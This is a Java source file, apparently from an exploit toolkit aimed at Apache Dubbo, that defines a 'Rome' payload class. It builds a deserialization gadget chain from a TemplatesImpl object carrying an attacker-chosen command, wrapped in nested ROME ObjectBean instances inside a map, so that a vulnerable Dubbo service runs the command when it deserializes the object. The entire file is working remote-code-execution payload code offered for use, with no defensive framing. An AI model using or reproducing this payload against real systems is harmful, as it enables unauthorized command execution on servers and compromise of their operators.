package com.threedr3am.exp.dubbo.payload.java;

import com.rometools.rome.feed.impl.ObjectBean;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import javax.xml.transform.Templates;

public class Rome implements Payload {

  /**
   *
   * @param args
   *
   * arg[0]=cmd
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    try {
      Object o = Gadgets.createTemplatesImpl(args[0]);
      ObjectBean delegate = new ObjectBean(Templates.class, o);
      ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
      return Gadgets.makeMap(root, root);
    } catch (Exception e) {
      e.printStackTrace();
    }
    return null;
  }
}
